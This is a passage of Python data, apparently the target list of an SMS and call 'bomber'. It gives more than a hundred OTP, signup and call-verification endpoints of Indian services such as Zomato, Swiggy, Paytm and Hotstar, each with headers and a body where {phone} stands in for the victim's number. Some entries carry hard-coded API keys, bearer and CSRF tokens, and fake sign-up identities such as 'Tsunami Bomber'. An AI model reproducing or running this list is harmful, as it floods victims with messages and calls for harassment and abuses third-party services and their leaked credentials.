    {"n": "MAMAEARTH", "u": "https://auth.mamaearth.in/v1/auth/initiate-signup", "m": "POST", "h": {"content-type": "application/json;charset=UTF-8", "isweb": "true"}, "d": {"mobile": "{phone}", "referralCode": ""}},
    {"n": "MAMAEARTH SEND", "u": "https://auth.mamaearth.in/v1/auth/send-otp", "m": "POST", "h": {"content-type": "application/json"}, "d": {"mobile": "{phone}", "isGokwik": False}},
    {"n": "DERMA CO", "u": "https://auth.thedermaco.com/v1/auth/initiate-signup", "m": "POST", "h": {"content-type": "application/json"}, "d": {"mobile": "{phone}", "referralCode": ""}},
    {"n": "DERMA CO SEND", "u": "https://auth.thedermaco.com/v1/auth/send-otp", "m": "POST", "h": {"content-type": "application/json"}, "d": {"mobile": "{phone}", "isGokwik": False}},
    {"n": "COVERFOX", "u": "https://www.coverfox.com/otp/send/", "m": "POST", "h": {"content-type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest"}, "d": "contact={phone}"},
    {"n": "TYREPLEX", "u": "https://www.tyreplex.com/includes/ajax/gfend.php", "m": "POST", "h": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest"}, "d": "perform_action=sendOTP&mobile_no={phone}&action_type=order_login"},
    {"n": "UPGRAD", "u": "https://prod-auth-api.upgrad.com/apis/auth/v5/registration/phone", "m": "POST", "h": {"content-type": "application/json", "client": "web", "course": "general-interest"}, "d": {"phoneNumber": "+91{phone}"}},
    {"n": "UDAAN", "u": "https://auth.udaan.com/api/otp/send?client_id=udaan-v2", "m": "POST", "h": {"content-type": "application/x-www-form-urlencoded;charset=UTF-8", "x-app-id": "udaan-auth"}, "d": "mobile={phone}"},
    {"n": "UDAAN WA", "u": "https://auth.udaan.com/api/otp/send?client_id=udaan-v2&whatsappConsent=true", "m": "POST", "h": {"content-type": "application/x-www-form-urlencoded;charset=UTF-8", "x-app-id": "udaan-auth"}, "d": "client_id=udaan-v2&whatsappConsent=true&mobile={phone}"},
    {"n": "NOBROKER V3", "u": "https://www.nobroker.in/api/v3/account/otp/send", "m": "POST", "h": {"content-type": "application/x-www-form-urlencoded; charset=UTF-8"}, "d": {"phone": "{phone}", "countryCode": "IN"}},
    {"n": "VIDYAKUL", "u": "https://vidyakul.com/signup-otp/send", "m": "POST", "h": {"content-type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest"}, "d": "phone={phone}"},
    {"n": "VEDANTU", "u": "https://user.vedantu.com/user/preLoginVerification", "m": "POST", "h": {"content-type": "application/json"}, "d": {"email": None, "phoneCode": "+91", "phoneNumber": "{phone}", "sType": "VEDANTU_F_7_N", "sValue": "FC34EE3ED23399CD7622BA1851D3E", "token": "5nXaR2BzqApBb3Wf", "ver": "1772629389", "version": 2, "whatsappCommunicationEnabled": False}},
    {"n": "SPOTIFY", "u": "https://accounts.spotify.com/api/v2/login/phone", "m": "POST", "h": {"content-type": "application/x-www-form-urlencoded"}, "d": "phonenumber=%2B91{phone}&version=2"},
    {"n": "UNACADEMY", "u": "https://unacademy.com/api/v3/user/user_check/?enable-email=true", "m": "POST", "h": {"content-type": "application/json", "x-platform": "0"}, "d": {"phone": "{phone}", "country_code": "IN", "otp_type": 1, "email": "", "send_otp": True, "is_un_teach_user": False}},
    {"n": "MOMS CO", "u": "https://acl.mgapis.com/v6/otp/generate?vendorCode=tmc&countryFilter=IND&languageFilter=EN&apikey=4b47c4d455ab989c71464395cc74c23a", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"countryCode": "91", "mobile": "{phone}", "isWhatsAppOpted": None, "name": "", "vendorCode": "tmc"}},
    {"n": "KUKU FM", "u": "https://kukufm.com/api/v1/users/auth/send-otp/", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"phone_number": "+91{phone}"}},
    {"n": "PROBO", "u": "https://prod.api.probo.in/api/v1/user/login", "m": "POST", "h": {"Content-Type": "application/json", "x-device-os": "ANDROID", "appid": "in.probo.pro"}, "d": {"mobile": "{phone}", "is_following_referee": False}},
    {"n": "HOICHOI", "u": "https://prod-api.viewlift.com/identity/signup?site=hoichoitv", "m": "POST", "h": {"Content-Type": "application/json", "x-api-key": "PBSooUe91s7RNRKnXTmQG7z3gwD2aDTA6TlJp6ef"}, "d": {"phoneNumber": "+91{phone}", "requestType": "send", "whatsappConsent": True}},
    {"n": "ZOMATO", "u": "https://accounts.zomato.com/login/phone", "m": "POST", "h": {"Content-Type": "application/x-www-form-urlencoded"}, "d": "country_id=1&number={phone}&type=initiate&verification_type=sms"},
    {"n": "ZOMATO WEB", "u": "https://www.zomato.com/webroutes/auth/login", "m": "POST", "h": {"content-type": "application/json"}, "d": {"country_id": 1, "phone": "{phone}", "verification_type": "sms", "method": "phone"}},
    {"n": "ZOMATO O2", "u": "https://www.zomato.com/php/o2_api_handler.php", "m": "POST", "h": {"Content-Type": "application/x-www-form-urlencoded"}, "d": "phone={phone}&type=voice"},
    {"n": "MY11CIRCLE", "u": "https://www.my11circle.com/api/fl/auth/v3/getOtp", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"mobile": "{phone}", "deviceId": "c4a7dd00-b941-48b7-89e8-4b758aa13d37", "deviceName": "", "refCode": "", "isPlaycircle": False}},
    {"n": "RUMMYCIRCLE", "u": "https://www.rummycircle.com/api/fl/auth/v3/getOtp", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"mobile": "{phone}", "isPlaycircle": False}},
    {"n": "HOUSING GQL", "u": "https://mightyzeus-mum.housing.com/api/gql?apiName=LOGIN_SEND_OTP_API&platform=desktop", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"query": "mutation($phone: String){sendOtp(phone:$phone){success message}}", "variables": {"phone": "{phone}"}}},
    {"n": "HOUSING V2", "u": "https://login.housing.com/api/v2/send-otp", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"phone": "{phone}", "country_url_name": "in"}},
    {"n": "HYPERPURE", "u": "https://api.hyperpure.com/api/verifyUser?phoneNumber={phone}", "m": "GET", "h": {"apiversion": "12.1", "apptype": "mweb", "x-client": "consumer"}},
    {"n": "HOTSTAR", "u": "https://www.hotstar.com/api/internal/bff/v2/pages/1/spaces/1/widgets/8?action=sendOtp&pageRef=myspace&page_enum=onboarding_login", "m": "POST", "h": {"content-type": "application/json", "x-country-code": "in", "x-hs-platform": "web"}, "d": {"body": {"initiate_by": 0, "phone_number": "{phone}"}}},
    {"n": "HDFC ERGO", "u": "https://here.co.in/users/v1/customer-portal/send-otp", "m": "POST", "h": {"content-type": "application/json", "x-api-client": "Website"}, "d": {"mobile": "{phone}", "source": "sms"}},
    {"n": "ASTROTALK", "u": "https://api.prod.astrotalk.in/AstroTalk/v2/login/user/mobile-otp-login", "m": "POST", "h": {}, "d": {"countryCode": "91", "isCall": "false", "appId": "4", "businessId": "1", "mobile": "{phone}", "isTermsAndConditionAccepted": "false"}},
    {"n": "ASTROTALK CALL", "u": "https://api.prod.astrotalk.in/AstroTalk/v2/login/user/mobile-otp-login", "m": "POST", "h": {}, "d": {"countryCode": "91", "isCall": "true", "appId": "4", "businessId": "1", "mobile": "{phone}", "isTermsAndConditionAccepted": "false"}},
    {"n": "ASTROYOGI", "u": "https://chang.astroyogi.com/api/UserAccountV2/WebGenerateOtpV3", "m": "POST", "h": {"content-type": "application/json", "authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJVc2VyVHlwZSI6IldlYlVzZXIiLCJFbnRpdHlJZCI6IjAiLCJTb3VyY2VVc2VyVHlwZSI6IiIsIlNvdXJjZUVudGl0eUlkIjoiIiwibmJmIjoxNzcyOTg5NjQ0LCJleHAiOjE3ODA3NjU2NDR9."}, "d": {"PhoneNumber": "{phone}", "PhoneCode": "91", "Domain": "Web", "CountryId": "IN", "CountryCodeByHeader": "IN"}},
    {"n": "VISHAL MEGA", "u": "https://www.vishalmegamart.com/on/demandware.store/Sites-vishalmegamart-Site/en_IN/Account-Login?rurl=1", "m": "POST", "h": {"content-type": "application/x-www-form-urlencoded; charset=UTF-8", "x-requested-with": "XMLHttpRequest"}, "d": "rurl=1&phoneNumber={phone}"},
    {"n": "APOLLO 247", "u": "https://apigateway.apollo247.in/auth-service/generateOtp", "m": "POST", "h": {"content-type": "application/json", "authorization": "Bearer 3d1833da7020e0602165529446587434"}, "d": {"loginType": "PATIENT", "mobileNumber": "+91{phone}"}},
    {"n": "APNA EMPLOYER", "u": "https://production.apna.co/api/userprofile/v1/otp/", "m": "POST", "h": {"content-type": "application/json"}, "d": {"phone_number": "91{phone}", "retries": 0, "hash_type": "employer", "source": "employer"}},
    {"n": "SWIGGY", "u": "https://www.swiggy.com/mapi/auth/signup", "m": "POST", "h": {"content-type": "application/json", "__fetch_req__": "true"}, "d": {"name": "dbdbdbd", "email": "tsunami@gmail.com", "password": "sndndndbdj283jsbsbs", "referral_code": "", "mobile": "{phone}", "_csrf": "jK7JY3E9u8xJ-1Q_DUwsGnPDhccbB4rGz0dKIbfk"}},
    {"n": "SWIGGY CALL", "u": "https://profile.swiggy.com/api/v3/app/request_call_verification", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"mobile": "{phone}"}},
    {"n": "BOOKMYSHOW", "u": "https://in.bookmyshow.com/api/members/otp/send", "m": "POST", "h": {"content-type": "application/json", "x-app-code": "WEB", "x-platform": "WEB"}, "d": {"channel": "phone", "subChannel": "sms", "details": {"phone": "{phone}", "origin": "https://in.bookmyshow.com", "isdCountryCode": "IN", "isdCode": "+91"}}},
    {"n": "MAKEMYTRIP", "u": "https://mapi.makemytrip.com/ext/web/pwa/send/token/SIGNUP_OTP?region=in&language=eng", "m": "POST", "h": {"content-type": "application/json", "authorization": "h4nhc9jcgpAGIjp", "currency": "inr", "region": "in", "user-country": "IN"}, "d": {"appHashKey": "@www.makemytrip.com #", "channel": ["MOBILE"], "countryCode": "91", "loginId": "{phone}", "type": 6}},
    {"n": "NAVI LOAN", "u": "https://navi.com/pl/api/web/otp/v1/generate", "m": "POST", "h": {"content-type": "application/json", "x-platform": "WEB", "x-tenant-id": "PL_WEB_V1"}, "d": {"deliveryType": "TEXT", "isRecipientEdited": False, "recipient": "{phone}", "resend": False}},
    {"n": "KREDITBEE", "u": "https://api.kreditbee.in/v1/me/otp", "m": "PUT", "h": {"content-type": "application/json"}, "d": {"appsflyerId": "60545308-9308-4fb3-b30c-793e2a7cae30-p", "mobile": "{phone}", "reason": "loginOrRegister"}},
    {"n": "99ACRES", "u": "https://www.99acres.com/api-aggregator/auth/login/generate-otp?version2=true", "m": "POST", "h": {"content-type": "application/json", "pagename": "HP", "platform": "desktop"}, "d": {"countryCode": "91", "mobile": "91-{phone}", "mode": "LOGIN_GENERATE", "platform": "desktop", "seamless": True, "sellerPage": False, "source": "homePage_Desktop"}},
    {"n": "CARWALE", "u": "https://www.carwale.com/api/user/login/otp-request/", "m": "POST", "h": {"content-type": "application/json;charset=UTF-8", "serverdomain": "CarWale"}, "d": {"mobileNo": "{phone}", "sourceModule": 14}},
    {"n": "OLX", "u": "https://www.olx.in/api/auth/authenticate?lang=en-IN", "m": "POST", "h": {"content-type": "application/json", "x-panamera-client-id": "web-desktop"}, "d": {"grantType": "phone", "phone": "+91{phone}", "language": "en-IN"}},
    {"n": "OLX CALL", "u": "https://www.olx.in/api/challenges", "m": "POST", "h": {"content-type": "application/json"}, "d": {"type": "call", "descriptor": "+91{phone}"}},
    {"n": "UPSTOX", "u": "https://service.upstox.com/login/open/v9/auth/1fa/otp/generate", "m": "POST", "h": {"content-type": "application/json"}, "d": {"data": {"mobileNumber": "{phone}"}}},
    {"n": "POLICYBAZAAR", "u": "https://myaccount.policybazaar.com/myacc/login/generateToken", "m": "POST", "h": {"content-type": "application/json", "authkey": "YG5BJOcSk7YmyujMNsOZnuwh7tb0s", "clientkey": "AEOTL"}, "d": {"source": "MYACC", "MobileNo": "{phone}"}},
    {"n": "WAKEFIT", "u": "https://api.wakefit.co/api/consumer-sms-otp/", "m": "POST", "h": {"Content-Type": "application/json", "API-Secret-Key": "ycq55IbIjkLb"}, "d": {"mobile": "{phone}", "whatsapp_opt_in": 1}},
    {"n": "HUNGAMA", "u": "https://communication.api.hungama.com/v1/communication/otp", "m": "POST", "h": {"Content-Type": "application/json", "identifier": "home"}, "d": {"mobileNo": "{phone}", "countryCode": "+91", "appCode": "un", "messageId": "1", "device": "web"}},
    {"n": "DOUBNUT", "u": "https://api.doubtnut.com/v4/student/login", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"phone_number": "{phone}", "language": "en"}},
    {"n": "BEEPKART", "u": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"phone": "{phone}", "city": 362}},
    {"n": "SNITCH", "u": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2", "m": "POST", "h": {"Content-Type": "application/json", "client-id": "snitch_secret"}, "d": {"mobile_number": "+91{phone}"}},
    {"n": "POKERBAAZI", "u": "https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"mobile": "{phone}", "mfa_channels": "phno"}},
    {"n": "PHARMEASY", "u": "https://pharmeasy.in/api/v2/auth/send-otp", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"phone": "{phone}"}},
    {"n": "SHIPROCKET", "u": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"mobileNumber": "{phone}"}},
    {"n": "MERU CAB", "u": "https://merucabapp.com/api/otp/generate", "m": "POST", "h": {"Content-Type": "application/x-www-form-urlencoded", "DeviceType": "Android"}, "d": "mobile_number={phone}"},
    {"n": "DAYCO", "u": "https://ekyc.daycoindia.com/api/nscript_functions.php", "m": "POST", "h": {"Content-Type": "application/x-www-form-urlencoded"}, "d": "api=send_otp&brand=dayco&mob={phone}&resend_otp=resend_otp"},
    {"n": "LENDING PLATE", "u": "https://lendingplate.com/api.php", "m": "POST", "h": {"Content-Type": "application/x-www-form-urlencoded"}, "d": "mobiles={phone}&resend=Resend"},
    {"n": "NEWME", "u": "https://prodapi.newme.asia/web/otp/request", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"mobile_number": "{phone}", "resend_otp_request": True}},
    {"n": "SMYTTEN", "u": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode", "m": "POST", "h": {"Content-Type": "application/json", "UUID": "8e6b1c3f-3d72-42af-89af-201b79dfdf2f"}, "d": {"phone": "{phone}", "email": "sdhabai09@gmail.com"}},
    {"n": "CARATLANE", "u": "https://www.caratlane.com/cg/dhevudu", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"query": "mutation { SendOtp(input: { mobile: \"{phone}\", isdCode: \"91\", otpType: \"registerOtp\" }) { status { message code } } }"}},
    {"n": "WELLACADEMY", "u": "https://wellacademy.in/store/api/numberLoginV2", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"contact_no": "{phone}"}},
    {"n": "SERVETEL", "u": "https://api.servetel.in/v1/auth/otp", "m": "POST", "h": {"Content-Type": "application/x-www-form-urlencoded"}, "d": "mobile_number={phone}"},
    {"n": "GOPINK CABS", "u": "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php", "m": "POST", "h": {"Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest"}, "d": "check_mobile_number=1&contact={phone}"},
    {"n": "SHEMAROOME", "u": "https://www.shemaroome.com/users/resend_otp", "m": "POST", "h": {"Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest"}, "d": "mobile_no=%2B91{phone}"},
    {"n": "COSSOUQ", "u": "https://www.cossouq.com/mobilelogin/otp/send", "m": "POST", "h": {"Content-Type": "application/x-www-form-urlencoded"}, "d": "mobilenumber={phone}&otptype=register"},
    {"n": "MYIMAGINE", "u": "https://www.myimaginestore.com/mobilelogin/index/registrationotpsend/", "m": "POST", "h": {"Content-Type": "application/x-www-form-urlencoded"}, "d": "mobile={phone}"},
    {"n": "OTPLESS", "u": "https://user-auth.otpless.app/v2/lp/user/transaction/intent/e51c5ec2-6582-4ad8-aef5-dde7ea54f6a3", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"mobile": "{phone}", "selectedCountryCode": "+91"}},
    {"n": "HUBBLE MONEY", "u": "https://api.myhubble.money/v1/auth/otp/generate", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"phoneNumber": "{phone}", "channel": "SMS"}},
    {"n": "DEALSHARE", "u": "https://services.dealshare.in/userservice/api/v1/user-login/send-login-code", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"mobile": "{phone}", "hashCode": "k387IsBaTmn"}},
    {"n": "SNAPMINT", "u": "https://api.snapmint.com/v1/public/sign_up", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"phone": "{phone}"}},
    {"n": "RENTOMOJO", "u": "https://www.rentomojo.com/api/RMUsers/isNumberRegistered", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"phone": "{phone}"}},
    {"n": "ANIMALL", "u": "https://animall.in/zap/auth/login", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"phone": "{phone}", "signupPlatform": "NATIVE_ANDROID"}},
    {"n": "ENTRI", "u": "https://entri.app/api/v3/users/check-phone/", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"phone": "{phone}"}},
    {"n": "REVV", "u": "https://st-core-admin.revv.co.in/stCore/api/customer/v1/init", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"mobile": "{phone}", "deviceType": "website"}},
    {"n": "A23 GAMES", "u": "https://pfapi.a23games.in/a23user/signup_by_mobile_otp/v2", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"mobile": "{phone}", "device_id": "android123", "model": "Google,Android SDK built for x86,10"}},
    {"n": "SPENCERS", "u": "https://jiffy.spencers.in/user/auth/otp/send", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"mobile": "{phone}"}},
    {"n": "PAYME INDIA", "u": "https://api.paymeindia.in/api/v2/authentication/phone_no_verify/", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"phone": "{phone}", "app_signature": "S10ePIIrbH3"}},
    {"n": "SHOPPERS STOP", "u": "https://www.shoppersstop.com/services/v2_1/ssl/sendOTP/OB", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"mobile": "{phone}", "type": "SIGNIN_WITH_MOBILE"}},
    {"n": "HYUGA AUTH", "u": "https://hyuga-auth-service.pratech.live/v1/auth/otp/generate", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"mobile": "{phone}"}},
    {"n": "LIFESTYLE", "u": "https://www.lifestylestores.com/in/en/mobilelogin/sendOTP", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"signInMobile": "{phone}", "channel": "sms"}},
    {"n": "HOMETRIANGLE", "u": "https://hometriangle.com/api/partner/xauth/signup/otp", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"mobile": "{phone}"}},
    {"n": "HEALTHMUG", "u": "https://api.healthmug.com/account/createotp", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"mobile": "{phone}"}},
    {"n": "KREDILY", "u": "https://app.kredily.com/ws/v1/accounts/send-otp/", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"mobile": "{phone}"}},
    {"n": "TATA MOTORS", "u": "https://cars.tatamotors.com/content/tml/pv/in/en/account/login.signUpMobile.json", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"mobile": "{phone}", "sendOtp": "true"}},
    {"n": "TRULYMADLY", "u": "https://app.trulymadly.com/api/auth/mobile/v1/send-otp", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"mobile": "{phone}", "locale": "IN"}},
    {"n": "SWIPE", "u": "https://app.getswipe.in/api/user/mobile_login", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"mobile": "{phone}", "resend": True}},
    {"n": "COUNTRY DELIGHT", "u": "https://api.countrydelight.in/api/v1/customer/requestOtp", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"mobile": "{phone}", "platform": "Android", "mode": "new_user"}},
    {"n": "RAPIDO", "u": "https://customer.rapido.bike/api/otp", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"mobile": "{phone}"}},
    {"n": "BETTERHALF", "u": "https://api.betterhalf.ai/v2/auth/otp/send/", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"mobile": "{phone}", "isd_code": "91"}},
    {"n": "NUVAMA", "u": "https://nma.nuvamawealth.com/edelmw-content/content/otp/register", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"mobileNo": "{phone}", "emailID": "test@example.com"}},
    {"n": "MPOKKET", "u": "https://web-api.mpokket.in/registration/sendOtp", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"mobile": "{phone}"}},
    {"n": "MORE RETAIL", "u": "https://omni-api.moreretail.in/api/v1/login/", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"mobile": "{phone}", "hash_key": "XfsoCeXADQA"}},
    {"n": "CHARZER", "u": "https://api.charzer.com/auth-service/send-otp", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"mobile": "{phone}", "appSource": "CHARZER_APP"}},
    {"n": "BIKEFIXUP", "u": "https://api.bikefixup.com/api/v2/send-registration-otp", "m": "POST", "h": {"Content-Type": "application/json", "client": "app"}, "d": {"phone": "{phone}", "app_signature": "4pFtQJwcz6y"}},
    {"n": "FOXY SMS", "u": "https://www.foxy.in/api/v2/users/send_otp", "m": "POST", "h": {"Content-Type": "application/json", "Platform": "web"}, "d": {"user": {"phone_number": "+91{phone}"}, "via": "sms"}},
    {"n": "FOXY WA", "u": "https://www.foxy.in/api/v2/users/send_otp", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"user": {"phone_number": "+91{phone}"}, "via": "whatsapp"}},
    {"n": "REDBUS", "u": "https://m.redbus.in/api/getOtp?number={phone}&cc=91", "m": "GET"},
    {"n": "REDBUS WA", "u": "https://m.redbus.in/api/getOtp?number={phone}&cc=91&whatsAppOpted=false", "m": "GET"},
    {"n": "UNIVEST", "u": "https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={phone}", "m": "GET"},
    {"n": "WORKINDIA", "u": "https://api.workindia.in/api/candidate/profile/login/verify-number/?mobile_no={phone}&version_number=623", "m": "GET"},
    {"n": "VYAPAR", "u": "https://vyaparapp.in/api/ftu/v3/send/otp?country_code=91&mobile={phone}", "m": "GET"},
    {"n": "CONFIRMTKT", "u": "https://securedapi.confirmtkt.com/api/platform/register?newOtp=true&mobileNumber={phone}", "m": "GET"},
    {"n": "CONFIRMTKT v2", "u": "https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber={phone}", "m": "GET"},
    {"n": "COOLWINKS", "u": "https://api.coolwinks.com/api/accounts/is_already_registered/?username={phone}", "m": "GET"},
    {"n": "ZEE5 B2B", "u": "https://b2bapi.zee5.com/device/sendotp_v1.php?phoneno={phone}", "m": "GET"},
    {"n": "MAKAAN CALL", "u": "https://www.makaan.com/apis/nc/sendOtpOnCall/16257065/{phone}?callType=otpOnCall", "m": "GET"},
    {"n": "MAGICBRICKS", "u": "https://api.magicbricks.com/bricks/verifyOnCall.html?mobile={phone}", "m": "GET"},
    {"n": "MYUPCHAR", "u": "https://www.myupchar.com/user_profile/resend_otp_via_voice?id={phone}", "m": "GET"},
    {"n": "JUSTDIAL", "u": "https://t.justdial.com/api/india_api_write/18july2018/sendvcode.php?mobile={phone}", "m": "GET"},
    {"n": "HAPPYEASYGO", "u": "https://www.happyeasygo.com/heg_api/user/sendRegisterOTP.do?phone=91%20{phone}", "m": "GET"},
    {"n": "CASHIFY", "u": "https://www.cashify.in/api/cu01/v1/app-link?mn={phone}", "m": "GET"},
    {"n": "BIGCASH", "u": "https://www.bigcash.live/sendsms.php?mobile={phone}&ip=192.168.1.1", "m": "GET", "h": {"Referer": "https://www.bigcash.live/games/poker"}},
    {"n": "MYGOV", "u": "https://auth.mygov.in/regapi/register_api_ver1/?api_key=57076294a5e2ab7fe000000112c9e964291444e07dc276e0bca2e54b&name=raj&gateway=91&mobile={phone}&gender=male", "m": "GET"},
    {"n": "AIRTN", "u": "https://www.airtel.in/referral-api/core/notify?messageId=map&rtn={phone}", "m": "GET"},
    {"n": "DIGITAL GAMEZONE", "u": "https://api.dotshowroom.in/api/dotk/vo1/user/login/{phone}?source=digital_showroom", "m": "GET"},
    {"n": "JIOMART MST", "u": "https://www.jiomart.com/mst/rest/v1/id/details/{phone}", "m": "GET"},
    {"n": "NETMEDS MOBILE", "u": "https://m.netmeds.com/mst/rest/v1/id/details/{phone}", "m": "GET"},

    # ---------- MISC ----------
    {"n": "MYLESCARS", "u": "https://www.mylescars.com/usermanagements/chkContact", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"contactNo": "{phone}"}},
    {"n": "DREAM11 SMS LINK", "u": "https://api.dream11.com/sendsmslink", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"siteId": "1", "mobileNum": "{phone}", "appType": "androidfull"}},
    {"n": "PAYTM", "u": "https://commonfront.paytm.com/v4/api/sendsms", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"phone": "{phone}", "guid": "2952fa812660c58dc160ca6c9894221d"}},
    {"n": "PAYTM REG", "u": "https://accounts.paytm.com/v2/api/register", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"email": "", "mobile": "{phone}", "loginPassword": "Pura@1090", "csrfToken": "f7ea628c-91a2-5f14-82ca-6f7eee295b1d", "clientId": "paytm-web-secure", "scope": "paytm", "responseType": "code", "theme": "mp-html5", "dob_agreement": True}},
    {"n": "INDIALENDS", "u": "https://indialends.com/internal/a/mobile-verification_v2.ashx", "m": "POST", "h": {"Content-Type": "application/x-www-form-urlencoded"}, "d": "aeyder03teaeare=1&ertysvfj74sje=91&jfsdfu14hkgertd={phone}&lj80gertdfg=0"},
    {"n": "CUREFIT", "u": "https://www.cure.fit/api/auth/loginPhoneSendOtp", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"phone": "{phone}", "countryCallingCode": "+91"}},
    {"n": "FIRSTCRY", "u": "https://www.firstcry.com/m/register", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"usrname": "rihanna luton", "usrmb": "{phone}", "usremail": "hazzzel@ggail.com", "usrpass": "dsLS@173"}},
    {"n": "DELHIVERY", "u": "https://direct.delhivery.com/delhiverydirect/order/generate-otp", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"phoneNo": "{phone}"}},
    {"n": "LENSKART REF", "u": "https://www.ref-r.com/clients/lenskart/smsApi", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"mobile": "{phone}", "submit": "1"}},
    {"n": "PRACTO", "u": "https://accounts.practo.com/send_otp", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"client_name": "Practo Android App", "mobile": "+91{phone}", "device_name": "samsung+SM-G9350"}},
    {"n": "PIZZAHUT", "u": "https://m.pizzahut.co.in/api/cart/send-otp", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"customer": {"MobileNo": "{phone}", "UserName": "{phone}", "merchantId": "98d18d82-ba59-4957-9c92-3f89207a34f6"}}},
    {"n": "GOIBIBO", "u": "https://www.goibibo.com/common/downloadsms/", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"mbl": "{phone}"}},
    {"n": "APOLLO PHARMA", "u": "https://www.apollopharmacy.in/sociallogin/mobile/sendotp/", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"mobile": "{phone}"}},
    {"n": "GRAB", "u": "https://api.grab.com/grabid/v1/phone/otp", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"method": "SMS", "countryCode": "id", "phoneNumber": "91{phone}", "templateID": "pax_android_production"}},
    {"n": "FROTELS", "u": "https://www.frotels.com/appsendsms.php", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"mobno": "{phone}"}},
    {"n": "GAPOON", "u": "https://www.gapoon.com/userSignup", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"mobile": "{phone}", "email": "a@a.com", "name": "a"}},
    {"n": "PORTER", "u": "https://porter.in/restservice/send_app_link_sms", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"phone": "{phone}", "referrer_string": "", "brand": "porter"}},
    {"n": "CITYFLO", "u": "https://cityflo.com/website-app-download-link-sms/", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"mobile_number": "{phone}"}},
    {"n": "NNNOW", "u": "https://api.nnnow.com/d/api/appDownloadLink", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"mobileNumber": "{phone}"}},
    {"n": "TREEBO", "u": "https://www.treebo.com/api/v2/auth/login/otp/", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"phone_number": "{phone}"}},
    {"n": "MOBIKWIK", "u": "https://webapi.mobikwik.com/p/account/otp/cell/v2", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"cell": "{phone}"}},
    {"n": "TINDER", "u": "https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=en", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"phone_number": "91{phone}"}},
    {"n": "KOTAK VKYC", "u": "https://www.kotak.com/811-savingsaccount-ZeroBalanceAccount/811/save-home-mobile.action", "m": "POST", "h": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest"}, "d": "cust_full_name=Tsunami+Bomber&cust_email=tsunami%40gmail.com&cust_mobile={phone}&cust_political_disclaimer=Yes&cust_fatca_disclaimer=Yes"},
